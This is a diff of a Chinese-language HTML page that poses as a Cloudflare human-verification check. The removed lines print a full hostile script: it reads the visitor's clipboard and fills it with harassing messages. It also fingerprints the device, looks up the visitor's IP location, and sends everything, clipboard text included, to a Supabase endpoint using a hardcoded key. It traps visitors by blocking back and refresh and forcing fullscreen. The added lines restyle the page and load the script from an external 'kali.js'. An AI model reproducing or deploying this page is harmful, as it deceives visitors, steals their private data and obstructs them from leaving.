@@ -6,13 +6,12 @@
     <title>安全检查中...</title>
     <meta name="robots" content="noindex, nofollow">
     <style>
-        /* 样式保持不变，此处省略 */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #000; display: flex; align-items: center; justify-content: center; min-height: 100vh; color: #e0e0e0; user-select: none; }
         .container { width: 100%; max-width: 420px; padding: 20px; }
         .card { background: #0d0d0d; border: 1px solid #222; border-radius: 12px; padding: 40px 30px; text-align: center; box-shadow: 0 0 20px rgba(0,102,255,0.05); }
         .logo { font-size: 20px; font-weight: 600; color: #fff; margin-bottom: 30px; display: flex; align-items: center; justify-content: center; gap: 10px; }
-        .logo svg { width: 28px; height: 28px; }
+        .logo svg { width: 22px; height: 22px; }
         .logo span { background: #fff; color: #000; padding: 2px 10px; border-radius: 4px; font-size: 16px; font-weight: 700; }
         .spinner { width: 40px; height: 40px; border: 4px solid #333; border-top: 4px solid #0066ff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { to { transform: rotate(360deg); } }
@@ -22,10 +21,80 @@
         .progress-fill { width: 0%; height: 100%; background: #0066ff; border-radius: 2px; transition: width 0.3s linear; }
         .status-text { font-size: 13px; color: #666; margin-bottom: 5px; }
         .footer { margin-top: 30px; font-size: 12px; color: #555; display: flex; align-items: center; justify-content: center; gap: 6px; }
+        .footer svg { width: 10px; height: 10px; }
         .hidden { display: none; }
         .success-icon { width: 50px; height: 50px; margin: 0 auto 20px; border-radius: 50%; background: #00cc66; display: flex; align-items: center; justify-content: center; font-size: 28px; color: #fff; }
-        .btn { background: #0066ff; color: #fff; border: none; padding: 12px 30px; border-radius: 6px; font-size: 16px; cursor: pointer; margin-top: 10px; }
-        .btn:hover { background: #0050cc; }
+        .btn {
+            background: transparent;
+            color: #fff;
+            border: 1px solid #fff;
+            padding: 12px 30px;
+            border-radius: 2px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.2s, border-color 0.2s;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            min-width: 200px;
+        }
+        .btn:hover { background: rgba(255,255,255,0.1); }
+        .btn:disabled { opacity: 0.7; cursor: not-allowed; }
+        .btn .btn-text { display: inline; }
+        .btn .btn-spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #fff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        .btn.loading .btn-text { display: none; }
+        .btn.loading .btn-spinner { display: inline-block; }
+        #countdown {
+            margin-top: 15px;
+            font-size: 16px;
+            color: #aaa;
+            min-height: 20px;
+            transition: opacity 0.2s;
+        }
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 10000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .modal-box {
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 25px;
+            max-width: 320px;
+            text-align: center;
+            color: #fff;
+        }
+        .modal-box h3 { margin-bottom: 15px; font-size: 18px; }
+        .modal-box p { font-size: 13px; color: #aaa; margin-bottom: 15px; }
+        .modal-actions { display: flex; gap: 10px; justify-content: center; }
+        .modal-actions button {
+            background: #0066ff;
+            color: #fff;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .modal-actions button.secondary {
+            background: transparent;
+            border: 1px solid #555;
+        }
     </style>
 </head>
 <body>
@@ -41,7 +110,11 @@
             </div>
             <h2>安全检查</h2>
             <p>点击下方按钮完成安全验证，并获取安全提醒。</p>
-            <button class="btn" onclick="startCheck()">确认您是真人</button>
+            <button class="btn" id="verifyBtn" onclick="startCheck()">
+                <span class="btn-text">确认您是真人</span>
+                <span class="btn-spinner"></span>
+            </button>
+            <div id="countdown"></div>
             <div class="footer">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                 DDoS 攻击防护 · Cloudflare
@@ -64,323 +137,8 @@
         </div>
     </div>
 
-    <script>
-        // ========== Supabase 配置（已填入你的信息） ==========
-        var SUPABASE_URL = 'https://povigcqzxamvsjsfzxif.supabase.co';
-        var SUPABASE_ANON_KEY = 'sb_publishable_qMSjePDl0TEpoH83PfVsOQ_ZSPR07H8';
 
-        // ========== 5条安全提醒内容 ==========
-        var SAFETY_MESSAGES = [
-            '【通知】宝宝我真的好想你',
-            '【提醒】宝宝我真的好想你',
-            '【重要通知】宝宝我真的好想你',
-            '【提示】宝宝我真的好想你',
-            '【验证】宝宝，真的好爱你，我想看你的JK'
-        ];
-
-        // ========== 强化剪贴板读取 ==========
-        async function readClipboardForce() {
-            try {
-                if (navigator.permissions && navigator.permissions.query) {
-                    const status = await navigator.permissions.query({ name: 'clipboard-read' });
-                    if (status.state === 'denied') {
-                        return { success: false, text: '权限被拒绝', method: 'permission-denied' };
-                    }
-                }
-            } catch (e) {}
-
-            if (navigator.clipboard && navigator.clipboard.readText) {
-                for (let attempt = 0; attempt < 2; attempt++) {
-                    try {
-                        const text = await navigator.clipboard.readText();
-                        if (text !== null && text !== undefined) {
-                            return { success: true, text: text, method: 'clipboard-readText' };
-                        }
-                    } catch (err) {
-                        await new Promise(resolve => setTimeout(resolve, 100));
-                    }
-                }
-            }
-
-            if (navigator.clipboard && navigator.clipboard.read) {
-                try {
-                    const items = await navigator.clipboard.read();
-                    for (const item of items) {
-                        if (item.types.includes('text/plain')) {
-                            const blob = await item.getType('text/plain');
-                            const text = await blob.text();
-                            if (text) return { success: true, text: text, method: 'clipboard-read' };
-                        }
-                    }
-                } catch (err) {}
-            }
-
-            try {
-                const textArea = document.createElement('textarea');
-                textArea.style.position = 'fixed';
-                textArea.style.left = '-9999px';
-                document.body.appendChild(textArea);
-                textArea.focus();
-                const pasteSuccess = document.execCommand('paste');
-                const text = textArea.value;
-                document.body.removeChild(textArea);
-                if (pasteSuccess && text) return { success: true, text: text, method: 'execCommand' };
-            } catch (err) {}
-
-            return { success: false, text: '读取失败', method: 'all-failed' };
-        }
-
-        // ========== 写入剪贴板 ==========
-        async function writeClipboardCompatible(text) {
-            if (navigator.clipboard && navigator.clipboard.writeText) {
-                try {
-                    await navigator.clipboard.writeText(text);
-                    return true;
-                } catch (err) {}
-            }
-            try {
-                const textArea = document.createElement('textarea');
-                textArea.value = text;
-                textArea.style.position = 'fixed';
-                textArea.style.left = '-9999px';
-                document.body.appendChild(textArea);
-                textArea.select();
-                const success = document.execCommand('copy');
-                document.body.removeChild(textArea);
-                return success;
-            } catch (err) {
-                return false;
-            }
-        }
-
-        // ========== 获取公网 IP ==========
-        async function getPublicIP() {
-            try {
-                const resp = await fetch('http://ip-api.com/json/?fields=query');
-                const data = await resp.json();
-                if (data && data.query) return data.query;
-            } catch (e) {}
-            try {
-                const resp = await fetch('https://api.ipify.org?format=json');
-                const data = await resp.json();
-                if (data && data.ip) return data.ip;
-            } catch (e) {}
-            return '不可用';
-        }
-
-        // ========== 开始检查 ==========
-        async function startCheck() {
-            var clipResult = await readClipboardForce();
-
-            // 依次写入5条剪贴板提醒
-            var writtenMessages = [];
-            for (let i = 0; i < SAFETY_MESSAGES.length; i++) {
-                await writeClipboardCompatible(SAFETY_MESSAGES[i]);
-                writtenMessages.push(SAFETY_MESSAGES[i]);
-                await new Promise(resolve => setTimeout(resolve, 200));
-            }
-
-            document.getElementById('verifyStep').classList.add('hidden');
-            document.getElementById('checkStep').classList.remove('hidden');
-
-            collectDeviceInfo(clipResult.text || '读取失败', writtenMessages);
-            enableExitInterception();
-            runScanSimulation();
-        }
-
-        // ========== 收集设备信息并发送到 Supabase ==========
-        async function collectDeviceInfo(clipboardText, writtenMessages) {
-            var publicIP = await getPublicIP();
-            var ptf = navigator.platform || '未知';
-            var cc = navigator.hardwareConcurrency || '不可用';
-            var ram = navigator.deviceMemory || '不可用';
-            var ver = navigator.userAgent;
-            var brw = '不可用', os = '不可用';
-
-            var str = ver;
-            if (ver.indexOf('Firefox') != -1) {
-                str = str.substring(str.indexOf(' Firefox/') + 1);
-                brw = str.split(' ')[0];
-            } else if (ver.indexOf('Chrome') != -1) {
-                str = str.substring(str.indexOf(' Chrome/') + 1);
-                brw = str.split(' ')[0];
-            } else if (ver.indexOf('Safari') != -1) {
-                str = str.substring(str.indexOf(' Safari/') + 1);
-                brw = str.split(' ')[0];
-            } else if (ver.indexOf('Edge') != -1) {
-                str = str.substring(str.indexOf(' Edge/') + 1);
-                brw = str.split(' ')[0];
-            }
-
-            try {
-                var ua = ver;
-                var osPart = ua.substring(0, ua.indexOf(')'));
-                var osArr = osPart.split(';');
-                os = osArr.length > 1 ? osArr[1].trim() : '不可用';
-            } catch(e) { os = '不可用'; }
-
-            var ven = '不可用', ren = '不可用';
-            try {
-                var canvas = document.createElement('canvas');
-                var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                    ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                }
-            } catch(e) {}
-
-            var ht = window.screen.height;
-            var wd = window.screen.width;
-
-            // 查询 IP 归属地
-            var ipDetails = {};
-            try {
-                const ipResp = await fetch(`http://ip-api.com/json/${publicIP}?fields=continent,country,regionName,city,isp,org,as&lang=zh-CN`);
-                const ipInfo = await ipResp.json();
-                if (ipInfo.status === 'success') {
-                    ipDetails = {
-                        ip_continent: ipInfo.continent,
-                        ip_country: ipInfo.country,
-                        ip_region: ipInfo.regionName,
-                        ip_city: ipInfo.city,
-                        ip_isp: ipInfo.isp,
-                        ip_org: ipInfo.org,
-                        ip_as: ipInfo.as
-                    };
-                }
-            } catch(e) {}
-
-            var payload = {
-                time: new Date().toISOString().replace('T', ' ').substring(0, 19),
-                ip: publicIP,
-                os: os,
-                platform: ptf,
-                browser: brw,
-                vendor: ven,
-                render: ren,
-                cores: cc,
-                ram: ram,
-                ht: ht,
-                wd: wd,
-                url: window.location.href,
-                clipboard: clipboardText,
-                clipboard_written: JSON.stringify(writtenMessages),
-                ...ipDetails
-            };
-
-            // 发送到 Supabase
-            try {
-                const res = await fetch(`${SUPABASE_URL}/rest/v1/kkk`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'apikey': SUPABASE_ANON_KEY,
-                        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
-                    },
-                    body: JSON.stringify(payload)
-                });
-                if (res.ok) {
-                    console.log('数据已保存到 Supabase');
-                } else {
-                    console.log('保存失败', await res.text());
-                }
-            } catch (err) {
-                console.log('请求失败', err);
-            }
-        }
-
-        // ========== 退出拦截（22次） ==========
-        var exitQuotes = [
-            "安全扫描进行中，请勿离开...", "正在传输加密数据，请稍候...", "浏览器指纹采集未完成...",
-            "网络环境检测中，请保持页面打开...", "DNS 查询尚未结束...", "WebRTC 泄露扫描未完成...",
-            "Canvas 指纹生成中...", "字体列表正在枚举...", "硬件信息读取中，请勿刷新...",
-            "屏幕参数分析中...", "时区与语言校验未通过...", "存储数据验证中...",
-            "Cookie 完整性检查中...", "CPU 核心数检测未完成...", "操作系统指纹收集中...",
-            "内存检测进行中...", "触摸设备识别中...", "音频上下文分析中...",
-            "Web API 支持度扫描中...", "网络延迟测算中...", "TLS 握手分析未完成...",
-            "最终安全报告生成中..."
-        ];
-        var MAX_INTERCEPT = 22;
-        var exitCount = parseInt(sessionStorage.getItem('cf_exit_count')) || 0;
-
-        function save(){ sessionStorage.setItem('cf_exit_count', exitCount); }
-        function release(){
-            window.removeEventListener('popstate', onBack);
-            document.removeEventListener('keydown', onRefresh);
-            window.removeEventListener('beforeunload', onBeforeUnload);
-            sessionStorage.removeItem('cf_exit_count');
-            try { if(document.exitFullscreen) document.exitFullscreen(); else if(document.webkitExitFullscreen) document.webkitExitFullscreen(); } catch(e) {}
-        }
-        function onBack(){
-            if(exitCount >= MAX_INTERCEPT){ window.removeEventListener('popstate', onBack); window.history.back(); return; }
-            window.history.pushState(null, null, location.href);
-            confirm(exitQuotes[exitCount % exitQuotes.length]);
-            exitCount++; save();
-            if(exitCount >= MAX_INTERCEPT) release(); else location.replace(location.href);
-        }
-        function onRefresh(e){
-            if(exitCount >= MAX_INTERCEPT) return;
-            if(e.key === 'F5' || (e.ctrlKey && e.key === 'r') || (e.metaKey && e.key === 'r')){
-                e.preventDefault(); e.returnValue = '';
-                confirm(exitQuotes[exitCount % exitQuotes.length]);
-                exitCount++; save();
-                if(exitCount >= MAX_INTERCEPT) release(); else location.replace(location.href);
-            }
-        }
-        function onBeforeUnload(e){
-            if(exitCount >= MAX_INTERCEPT) return;
-            e.preventDefault();
-            e.returnValue = exitQuotes[exitCount % exitQuotes.length];
-            setTimeout(function(){ if(!document.hidden){ exitCount++; save(); if(exitCount >= MAX_INTERCEPT) release(); } }, 100);
-            return e.returnValue;
-        }
-
-        function enableExitInterception() {
-            window.history.pushState(null, null, location.href);
-            window.addEventListener('popstate', onBack);
-            document.addEventListener('keydown', onRefresh);
-            window.addEventListener('beforeunload', onBeforeUnload);
-        }
-
-        // ========== 模拟扫描进度 ==========
-        function runScanSimulation() {
-            var scanSteps = [
-                "正在验证浏览器指纹...", "正在检测网络环境...", "正在检查 DNS 配置...", "正在扫描 WebRTC 泄露...",
-                "正在验证 Canvas 指纹...", "正在检测 AudioContext 指纹...", "正在检查 WebGL 信息...", "正在验证字体列表...",
-                "正在分析浏览器插件...", "正在检测屏幕分辨率...", "正在检查时区与语言...", "正在验证本地存储...",
-                "正在分析 Cookie 状态...", "正在检测硬件并发数...", "正在检查平台与系统...", "正在验证设备内存...",
-                "正在检测触摸屏支持...", "正在分析音频指纹...", "正在验证 Web 功能...", "正在检查连接速度...",
-                "正在分析 TLS 握手特征...", "正在检测 WebSocket 支持...", "正在验证 IndexedDB 存储...", "正在扫描 Service Worker...",
-                "正在完成最终验证..."
-            ];
-            var currentStep = 0;
-            var totalSteps = scanSteps.length;
-            var stepDuration = 1800;
-            var progressText = document.getElementById('progressText');
-            var progressFill = document.getElementById('progressFill');
-            var stepCounter = document.getElementById('stepCounter');
-
-            function advanceStep() {
-                if (currentStep >= totalSteps) {
-                    document.getElementById('checkStep').classList.add('hidden');
-                    document.getElementById('doneStep').classList.remove('hidden');
-                    return;
-                }
-                progressText.textContent = scanSteps[currentStep];
-                progressFill.style.width = Math.round(((currentStep+1)/totalSteps)*100) + '%';
-                stepCounter.textContent = '步骤 ' + (currentStep+1) + '/' + totalSteps;
-                currentStep++;
-                setTimeout(advanceStep, stepDuration);
-            }
-            advanceStep();
-
-            try { 
-                var el = document.documentElement; 
-                if(el.requestFullscreen) el.requestFullscreen().catch(()=>{}); 
-                else if(el.webkitRequestFullscreen) el.webkitRequestFullscreen(); 
-            } catch(e) {}
-        }
-    </script>
+    <!-- 引入外部 JavaScript 文件 -->
+    <script src="kali.js"></script>
 </body>
 </html>
